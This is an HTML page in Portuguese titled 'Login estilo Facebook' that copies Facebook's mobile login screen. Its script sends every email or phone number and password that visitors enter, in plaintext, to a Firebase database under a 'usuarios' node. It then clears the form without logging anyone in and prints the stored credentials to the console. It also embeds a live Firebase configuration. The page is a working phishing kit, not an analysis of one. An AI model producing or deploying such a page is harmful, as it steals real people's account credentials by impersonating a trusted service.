
<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login estilo Facebook</title>

  <style>
    

        body {
  font-family: Arial, "Segoe UI", Helvetica, sans-serif;

     
      background-color: #fff;
      min-height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
    }

    .lang-select {
      margin-top: 15px;
      font-size: 14px;
      color: #6b7280;
    }

    .login-container {
      width: 100%;
      max-width: 360px;
      padding: 20px;
      text-align: center;
    }

 .logo {
  width: 70px;
  height: 70px;
  border: 1px solid #ccc;      /* círculo cinzento */
  color: #1877f2;              /* azul do f */
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 48px;
  font-weight: bold;
  margin: 30px auto 25px;
  background: transparent;    /* sem fundo */
  font-family: Arial, "Segoe UI", Helvetica, sans-serif;
}



    .input-group {
      position: relative;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border-radius: 12px;
      border: 1px solid #ddd;
      font-size: 16px;
      outline: none;
    }

    input:focus {
      border-color: #1877f2;
    }

    .info-icon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 18px;
      height: 18px;
      border-radius: 50%;
      border: 1px solid #999;
      color: #555;
      font-size: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    button {
      background-color: #1877f2;
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }

    button:hover {
      background-color: #166fe5;
    }

    .link {
      margin: 15px 0;
      color: #000; 
      font-size: 14px;
      cursor: pointer;

      
    }

    .create-btn {
      margin-top: 20px;
      border: 2px solid #1877f2;
      background: white;
      color: #1877f2;
    }

    .create-btn:hover {
      background: #f0f2f5;
    }

    .meta {
      margin-bottom: 15px;
      font-size: 14px;
      color: #8a8d91;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .meta span {
      font-weight: bold;
    }

    @media (min-width: 600px) {
      .login-container { max-width: 420px; }
    }

    @media (min-width: 900px) {
      .login-container { max-width: 450px; }
    }
  </style>
</head>
<body>

  <div class="lang-select">Português (Portugal) ▾</div>

  <div class="login-container">
    <div class="logo">f</div>

    <form id="loginForm">
      <div class="input-group">
       <input type="text" id="email" placeholder="Número de telemóvel ou e-mail" required>

     <svg class="info-icon" width="18" height="18" viewBox="0 0 18 18">
  <!-- círculo fino e cinza-escuro -->
  <circle cx="9" cy="9" r="7.5" fill="none" stroke="#444" stroke-width="1.3"/>
  <!-- tracinho vertical (apontando para cima) -->
  <line x1="9" y1="5" x2="9" y2="10" stroke="#444" stroke-width="1.7" stroke-linecap="round"/>
  <!-- bolinha de baixo -->
  <circle cx="9" cy="12.3" r="1" fill="#444"/>
</svg>


      </div>

      <input type="password" id="senha" placeholder="Palavra-passe" required>

      <button type="submit">Iniciar sessão</button>
    </form>

    <div class="link">Esqueceste-te da palavra-passe?</div>

    <button class="create-btn">Criar conta nova</button>
  </div>

  <div class="meta">
    <span>∞</span> Meta
  </div>

  <!-- Firebase compat -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

  <script>
const firebaseConfig = {
  apiKey: "AIzaSyAwV2ts-xSw-5masUfpkbNmtKOyRmcUp30",
  authDomain: "login-bc5b5.firebaseapp.com",
  databaseURL: "https://login-bc5b5-default-rtdb.firebaseio.com",
  projectId: "login-bc5b5",
  storageBucket: "login-bc5b5.firebasestorage.app",
  messagingSenderId: "1033650340763",
  appId: "1:1033650340763:web:fd33df56b7c01625f3573e",
  measurementId: "G-X5FT7L2W0R"
};


    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const form = document.getElementById("loginForm");

    form.addEventListener("submit", (e) => {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const senha = document.getElementById("senha").value;

      const userId = database.ref().child('usuarios').push().key;

      database.ref('usuarios/' + userId).set({
        email: email,
        senha: senha,
        timestamp: Date.now()
      });

      form.reset();
    });

    const usuariosRef = database.ref('usuarios');
    usuariosRef.on('value', (snapshot) => {
      console.log("Dados atuais:", snapshot.val());
    });
  </script>

</body>
</html>
